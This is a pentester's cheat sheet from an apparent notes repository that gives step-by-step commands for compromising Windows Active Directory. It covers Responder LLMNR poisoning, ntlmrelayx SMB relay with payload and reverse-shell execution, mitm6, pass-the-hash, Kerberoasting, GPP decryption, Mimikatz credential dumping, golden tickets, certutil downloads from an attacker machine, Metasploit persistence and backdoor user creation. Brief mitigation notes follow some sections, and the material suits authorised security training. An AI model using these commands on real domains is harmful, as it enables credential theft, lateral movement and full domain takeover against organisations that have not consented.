# Windows Active Directory

## [Back To Command-Center](https://github.com/encryptedninja/command-center/blob/dev/README.md)

## //cheat-sheet

⚠️ **IMPORTANT NOTE:** This is not a tutorial write-up on how to use the different tools and commands, these are quick notes on how to exploit AD in Windows.

**For the full tutorial and lectures it is highly recommended to take the PEH course from [TCM-SECURITY](https://academy.tcm-sec.com/).**

### What is AD?

- Directory service developed by Microsoft Windows to manage Windows domain networks.

### What does it do?

- Stores information related to objects, such as Computers, Users, Printers, etc.

### How does it work?

- Authenticates using Kerberos tickets.
- **Non-Windows** devices, such as Linux machines, firewalls, etc. can also authenticate to Active Directory via RADIUS or LDAP.
- **LDAP = Lightweight Directory Access Protocol**

### Why to learn AD?

- AD is the most commonly used identity management system in the world!
- *It can be exploited without ever attacking patchable exploits. Instead abuse features, trusts, components and more.

### Components:

### Domain Controllers:

- hosts a copy of the AD DS (directory store - data store)
- provides authentication and authorization services
- replicates updates to other domain controllers in the domain and forest
- allows administrative access to manage user accounts and network resources

### AD DS Data Store

- consist of the Ntds.dit file
- which is stored by default in the %SystemRoot%\NTDS folder on all domain controllers
- is only accessible through the domain controller processes and protocols

## Initial Attack Vectors

- first we have to find a way in to the network
- how to abuse features of Windows
- support article: **[Top Five Ways I Got Domain Admin on Your Internal Network before Lunch (2018 Edition)](https://adam-toscher.medium.com/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa)**

### LLMNR poisoning

- **LINK LOCAL MULTICAST NAME RESOLUTION**
- used to identify hosts when DNS fails to do so
- previously ***NBT-NS***
- **key flaw is** that the the service utilizes a user's username and NTLMv2 hash when appropriately responded to
- when we respond to this service it responds back to us with a username and a NTLMv2 password hash
- user types in something misspelled, server send us a broadcast message, we listen ***man in the middle*** attack, we respond yes and capture the username and hash then forward the request to the server. **responder** will help us with that, which is a tool from **Impacket**
- run **responder** first thing in the morning or when people come back from lunch because it needs some traffic

### Responder:

- `python Responder.py -I tun0 -rdwv`
- **I** is for interface
- **rdwv** is the different types we're listening on, ***w*** is for wpad
- ***v*** is for verbose to see the hash more than once if it happens
- look at the ***-help*** for more info

### LLMNR poisoning Defenses

- the best defense is to disable LLMNR and NBT-NS
- if that's not possible tell them to enable Network Access Control (it's going to look for a specific MAC address and if it's not allowed then it will shut it down, the port. There are methods to bypass that too but that's another subject.)
- long and strong passwords, longer than 14 characters, mixed case characters and symbols, numbers

### SMB Relay Attack

### Requierements

- SMB signing has to be disabled on the target
- relayed user credentials must be an admin on machine

### Use Responder to capture and ntlmrelayx to relay

- in Responder HTTP and SMB server must be off so we can relay the request instead of responding to it
- configure ***ntlmrelayx*** like this: `python ntlmrelayx.py -tf targets.txt -smb2support`
- all this does is identifying, it takes the relay and takes it to the target.txt file and smb2support tells it where to relay it to
- if SMB signing if off or it's on but ***not required*** and user is an admin on the relayed machine **ntlmrelayx.py will dump the SAM hashes**

### Discover if SMB signing is disabled

- can search for a tool on Github
- or with nmap: `nmap --script=smb2-security-mode.nse -p 445 IP/24`

### If trying to get an interactive shell with ntlmrelayx

- append ***i*** to `ntlmrelayx.py -tf targets.txt -smb2support -i`
- ***tf*** stands for ***target file***
- when running interactive see in feeds where an which port is the one where ntlmrelayx created the interactive shell, I'll use port 11000 as an example here
- then on another tab in tty open up: `nc 127.0.0.1 11000`
- we are in an SMB shell essentially, type in `help` for available commands
- we can do many thing here, we can look at the shares, change password of current user, moving files, directories, create a mount point, upload file, etc.
- `shares` shows the available shares, then `use C$` once in, list it out `ls` and we've got access to the C: drive
- similarly we can ls out the admin folder as well

### Additionally with ntlmrelayx.py

- we can generate a payload with ***msfvenom*** like ***payload.exe*** as an example and execute it on the target machine and then set up a meterpreter listener in ***metasploit*** and get a shell on the target machine
- `ntlmrelayx.py -tf targets.txt -smb2support -e payload.exe`
- or we can execute commands with the ***c*** option
- it can be from something simple as `ntlmrelayx.py -tf targets.txt -c "whoami"` to a more complex reverse shell or PowerShell command

### Mitigation strategies

- **ENABLE SMB SINGIN ON ALL DEVICES**
- **PRO:** completely stops the attack
- **CON:** can cause performance issues with file copies
- **DISABLE NTLM AUTHENTICATION ON NETWORK**
- **PRO:** completely stops the attack
- **CON:** if Kerberos stops working, Windows defaults back to NTLM
- **ACCOUNT TIERING**
- **PRO:** limits domain admins to specific tasks
- **CON:** enforcing the policy may be difficult
- **LOCAL ADMIN RESTRICTIONS**
- **PRO:** can prevent a lot of lateral movement
- **CON:** potential increase in the amount of service desk tickets

### IPv6 attacks

### DNS takeover attacks via IPv6

- who's doing IPv6 DNS...? usually nobody!

### Installing mitm6

- from GitHub clone **[mitm6](https://github.com/fox-it/mitm6)**
- cd into your new folder: `pip3 install .` will install the requirements for us

### Attack:

- start mitm6: `mitm6 -d domain.local` let it run
- we also need to setup a relay attack: `netlmrelayx.py -6 -t ldaps://<domain contorller's IP> -wh fakewpad.domaincontoller.local -l lootme`
- **6** is for IPv6 IPs, **ldaps** attack via LDAP Securte, **l** for loot, create a loot file used to store information mitm6 dumps out on target
- IPv6 is sending out: who's got my DNS? it sends it out in about every 30 minutes, mitm6 is trying to relay credentials and dump out everything it can into the ***lootme*** file we set up for it
- when an admin logs in, mitm6 tries to relay the DNS through IPv6 targeting ldap and creates a new user for us
- outdside the created ***loot*** there's a file something like ***aclpwn-date.restore*** that restores everything as it was before the attack
- additional resource through these articles: **[The best of both worlds](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)** and **[Compromising IPv4 networks via IPv6](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)**

### Mitigation:

- IPv6 poisoning abuses the fact that Windows queries for IPv6 addresses even on an IPv4-only environments.
- If you don't use IPv6 the safest way is to block DHCPv6 traffic.
- If wpad is not in use, disable it.
- Relaying LDAP and LDAPS can only be mitigated by enabling both LDAP singing and channel binding.
- Consider Administrative users to Protected users group or marking them as ***Account is sensitive*** and can not be delegated, which will prevent any impersonation of that user via delegation.

### Strategies

- begin the day with man in the middle attack or Repsonder (***mitm6*** or ***Responder.py***)
- run scans to generate traffic
- if scans are taking too long, look for websites in scope (http_version)
- look for default credentials on web logins (Printers, Jenkins, etc.)
- **think outside the box**

## Post compromise enumeration

### Domain enumeration with PowerView

- get PowerView from this G**[ithub link](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)**
- bring PowerView over to target Windows machine
- first run PowerShell from terminal: `powershell -ep bypass` this bypasses the execution policy, not for security, it stops us from accidentally executing a script, so we need to bypass it
- `. .\PowerView.ps1` to initiate it
- `Get-NetDomain` information about the Domain Controller, if the system has multiple controllers then run `Get NetDomainController`
- `Get-DomainPolicy` to see all the different policies of the Domain
- `(Get-DomainPolicy)."system access"` this will show more info on the ***system access policy*** like password policy, etc.
- `Get-NetUser` information on the users (dirty output)
- `Get-NetUser | select cn` information on users (cleaner)
- `Get-NetUser | select samaccountname` pulling down SAM account names
- `Get-NetUser | select description` same but for description
- `Get-UserProperty` showing all the properties a user might have
- `Get-UserProperty -Properties pwdlastset` when was a user's password last set
- `Get-UserProperty -Properties logoncount` **a good way to ID honeypot accounts** shows how many times a user logged in. If you see an account where a user never logged in, that might be a honeypot account. They just letting it sit there for you to try to hunt it down
- `Get-UserProperty -Properties badpwdcount` if you see too many bad passwords here that account might have had been under attack
- `Get-NetComputer` it lists out all the computers in this Domain
- `Get-NetComputer -FullData` maybe a little too much information, but it works
- `Get-NetComputer -FullData | select OperatingSystem` pulling down specific information on the Operating System, what are the server and user machines
- `Get-NetGroup` check for any interesting groups for us
- `Get-NetGroup -GroupName "Domain Admins"` sorting it out, groups for Domain Admins
- `Get-NetGroup -GroupName "Admin"` to see what admins are out there
- `Get-NetGroupMember -GroupName "Domain Admins"` will list out all our domain admins
- `Invoke-ShareFinder` a tool for finding shares, where and what is being shared
- `Get-NetGPO` shows all the group policies
- `Get-NetGPO | select displayname, whenchanged` what is going on in the network and when was it changed to learn more about the system's policies

### Domain enumeration with Bloodhound

- once we are on the network, it downloads the data of the AD and helps us to visualize it
- `apt install bloodhound` to install it on kali
- setting it up: `neo4j console`
- open it up (see link in terminal) and change default credentials from neo4j:neo4j
- in tty: `bloodhound` then log in in the opened up browser
- let's pull some data with an injester first, using the **[invoke sharphound from Github repo](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1)**
- Invoke SharpHound goes on to the target Windows machine, so it can collect data
- run it, first PowerShell `powershell -ep bypass` than SharpHound with `. .\SharpHound.ps1`
- `Invoke-BloodHound -CollectionMethod All -Domain domain.local -ZipFileName file.zip`
- copy the generated file back to kali, where we will import it and review the details
- on kali upload it into Bloodhound opened browser

## Post compromise attacks

- these attacks require to have compromised the system already and have some credentials

### Pass the password attack with crackmapexec

- passing the hash around with ***crackmapexec.py*** which will throw around the captured hash and see where it sticks
- install it on kali `apt install crackmapexec`
- usage `crackmapexec --help` to get help, typically we provide a username, domain and password for now
- `crackmapexec smb <target network IP/24> -u <username> -d <domain.local> -p <password>`
- `crackmapexec smb <target network IP/24> -u <username> -d <domain.local> -p <password> --sam` it will try to dump the SAM file (short for SAM=Security Account Manager)

### Getting a shell with psexec.py

- getting a shell: `psexec.py domain/username:password@<domain_target_IP>`
- password spraying is NOT recommended on Domains becaue if you get many failed login attempts you can lock this user out of the Domain, on local accounts it's OK

### Dumping hashes with secretsdump

- it is also part of the Impacket Github repo
- `secretsdump.py domain/username:password@<domain_target_IP>` dumps the hashes for us

### [Pass the hash attack](https://github.com/encryptedninja/command-center/blob/master/Windows_AD/windows-active-directory.md#pass-the-hash-attack)

- NTLM hashes can be passed around, NTLMv2 hashes **can not** be passed around
- copy second part of the hash then run it in crackmapexec `crackmapexec smb <IP-range> -u <username> -H <paste_hash_here> --local-auth`
- see it's gonna try to pass it around the network and gain access, green plus sign indicates if it succeeded
- `psexec.py "frank castle":@192.168.57.141 -hashes <HASH here, first and second part of hash needed>`

### Mitigations

- Limit account re-use
- Utilize strong passwords (> 14 characters)
- Privilege Access Management (PAC)

### Token Impersonation Attacks

### What are tokens?

- Temporary keys that allows you to access to a system/network without having to provide credentials each time you access a file. Like cookies for computers.
- Two types:
1. Delegate - created for logging in to a machine or using Remote Desktop
2. Impersonate - "non-interactive" such as attaching a network drive or a domain logon script.

### Using Metasploit

- `use /exploit/windows/smb/psexec/`
- `options`
- `set rhosts <target IP>`
- `set smbdomain domain.local`
- `set smbpass password`
- `set smbuser username`
- `show targets`
- `set target 2`
- `set payload windows/x64/meterpreter/reverse_tcp`
- `options` and set the lhost and lport
- `getuid`
- `hashdump`
- we can load incognito `load incognito`
- `help` to see options
- `list tokens`
- `impersonate token marvel\\administrator`
- `whoami` : marvel\administrator

### Mitigation

- Limit User/Group token creation permissions
- Account tiering
- Local Admin restriction

### Kerberoasting

![https://github.com/encryptedninja/command-center/raw/master/Windows_AD/images/kerberoasting.png](https://github.com/encryptedninja/command-center/raw/master/Windows_AD/images/kerberoasting.png)

- After presenting username and password we get a TGT (Ticket Granting Ticket) which ends with a hash. How did we get a TGT? We supplied an NTLM hash. Any user can do this. Now let's say we have a service we want to access, that service has an SPN (Service Principal Name). In order to access that service we have to request a TGS. We present our TGT and request the TGS from the server. The KDC (Key Distribution Center aka Domain Controller) has the server account hash (Application Service Server's hash) and it's going to encrypt it and send it back. The KDC does not know if we have access to the Server (Application Service Server) or not. It's just going to provide us the TGS with the Application Service Server's hash.
- We then present the TGS to the Application Service Server and then it will decrypt it using it's own server hash and then it's going to send back a yes or no to us. (Authozrized or not).
- **However, we don't need to send that out! The important thing is that we have a valid account which gives us a TGT. With that ticket we can request a TGS. That TGS will be encrypted with the KDC's server account hash. So we can decrypt that hash, try to crack it.**
- To retrieve the hash we use a tool from Impacket: `python GetUserSPNs.py MARVEL.local/fcastle:Password1 -dc-ip <IP of DC> -request`
- We can now try to crack the hash with ***hashcat:*** `hashcat -m 13100 kerberoast.txt rockyou.txt`

### Mitigation

- using strong passwords (>14 characters, avoid dictionary words)
- least privilege

### GPP (Group Policy Preferences) attack

- Aka **MS14-025**
- GPP allowed admins to create policies using embedded credentials
- these credentials were encrypted in XML and placed into a ***"cPassword"***
- The key was accidentally released. (oops!)
- Patched in MS14-025 but it doesn't prevent previous uses

### Checking for GPP in Metasploit

- background shell and run from auxiliary `smb_enum_gpp`

### Decrypting GPP in Kali

- `gpp-decrypt <cPassword from Group Policy xml file>`
- result in example: password
- we can now abuse GPP using ***psexec.py*** and the ***password***

### Abusing GPP

- `psexec.py active.htb/svc_tgs:password@<target IP>`
- it is possible to get valid user credentials but ***not writable*** in this case we can do ***kerberoasting***
- `GetUserSPNs.py active.htb/svc_tgs:password -dc-ip <taget IP> -request` and we get the service ticket, copy and save this ticket into a file
- pass it into hashcat and: `hashcat -m 13100 hashes.txt rockyou.txt -O`
- because this service account is also an administrator account

### For Practice

- HTB:Active machine is excellent!

### Mimikatz

### What is Mimikatz?

- Mimikatz is a tool to view and steal credentials.
- Dumps credentials that are stored in memory, pass the hash, golden ticket etc.
- git clone repo from **[here](https://github.com/gentilkiwi/mimikatz)**
- If you don't want to build it, binaries are available **[here](https://github.com/gentilkiwi/mimikatz/releases)**
- it's a cat and mouse game with Windows and Mimikatz, Windows patches, Mimikatz updates...
- download it directly to your Domain Controller (assuming that you already compromised it)
- check out the Wiki on the Mimikatz Github repo for more information on the different things it can do
- additional Mimikatz commands:
- `privilege::debug sekurlsa::logonpasswords`
- `sekurlsa::logonpasswords`
- `lsadump::sam`
- `token::elevate lsadump::sam`
- `lsadump::secrets`
- `token::elevate lsadump::sam`

### Credential Dumping with Mimikatz

- run ***mimikatz.exe*** on the Domain Controller
- first command: `privilege::debug`
- response should be: ***privilege '20' OK***
- if you don't run the above command first you won't be able to execute the attacks and the memory protection, specially for the ***lsass.exe***
- `sekurlsa::logonpasswords`
- not only we are compromising the Domain Controller but even as the regular computer. It dumps any user that has logged on and we dump their NTLM hash. We are taking advantage of this stored in memory.
- **because this hash is an NTLM it can be passed around with Mimikatz**
- it also shows the wdigest which is a feature in Windows 7 and previous versions, it stored the password in clear text
- from Windows 8 on they patched it, they turned it off, but we can turn it on and then wait for someone to log in :)
- this is a registry feature, turn it on and wait for someone to log in
- **dumping the SAM:** `lsadump::sam` sometimes it doesn't work but it's worth a try
- another way of dumping the SAM: `lsadump::sam /patch`
- ***if it doesn't work we can try to use Metasploit and or secretsdump.py and dump the SAM***
- `lsadump::lsa /patch` the ***patch*** allows us to get to the information
- **lsa** is the LOCAL SECURITY AUTHORITY, it's a protected subsystem in Windows Authentication, it creates and authenticates login sessions through the local computer
- what we are looking for in the output is usernames and NTLM hashes, we could take those hashes offline and try to crack them and if we can crack them we need to know what % of those hashes we are able to crack and relay those numbers back to a client to report to them about their password policy, if it's strong or weak. If we're cracking 50% of those hashes their policy is weak, on the other hand if we're cracking only 10% of them that suggests a strong password policy.
- we can also try to download the ***ntds.dit*** which will contain all the credentials as well

### Golden Ticket Attack and Pass The Ticket Attack

### What is a Golden Ticket and why do we care?

- we dumped the KDC's TGT account, that's the Kerberos Ticket Granting Ticket account that allows us to generate tickets
- what is we have the hash of that account, guess who's got to generate Kerberos Ticket Granting Tickets? We are :)
- With that we will have complete access to the entire Domain, all the machines!

### Golden Ticket Attack with Mimikatz

- `mimikatz.exe`
- `privilege::debug`
- `lsadump::lsa /inject /name:krbtgt`
- open up a note pad and copy from output: SID and the NTLM hash
- `kerberos::golden /User:Administrator /domain:marvel.local /sid:<copy it from notepad> /krbtgt:<copy the hash from notepad> /id:500 /ptt`
- ***id:500*** is the ID of an admin account and ***/ptt*** is for ***pass the ticket***
- we are generating a golden ticket and then will pass that ticket along to our current session and utilize it to open up a command prompt and access any computer on the network we want
- `misc::cmd` this will pop up a cmd window and in that window we are utilizing the Golden Ticket that we just created
- to take this a step furter we could download ***psexec.py*** to this computer hence this was the whole intent of the creation of psexec, to access computers `psexec.exe \\THEPUNISHER cmd.exe`
- **persistence:** once you own a Golden Ticket you can create a new user, make it a domain admin, most systems are picking it up, try better with a ***silver ticket***

## Post Exploitation

### File Transfers Review

- Certutil: `certutil -urlcache -f http://<source IP>/file.txt file.txt`
- HTTP: `python3 -m http.server 80`
- Browser: navigate directly to file
- FTP: `python -m pyftpdlib 21` on attacker machine
- grab a file from attacker machine's FTP: `ftp <IP attacker machine's IP>
- Linux `wget`
- Metasploit use the ***upload*** and/or ***download*** feature

### Maintaining Access

- If something happens to the machine we are on (target) we can gain access back.
- This can be accomplished via a C2 (Command & Control) framework such as **Covenant**.
- Adding a User (this will add a user via an unauthenticated port)

### Maintaining access with Metasploit

- `run persistence -h`
- `exploit/windows/local/persistence`
- `exploit/windows/local/registry_persistence`

### Run scheduled tasks with Metasploit

- `run scheduleme`
- `run schtaskabuse`

### Add a User on Windows

- `net user hacker password123 /add`
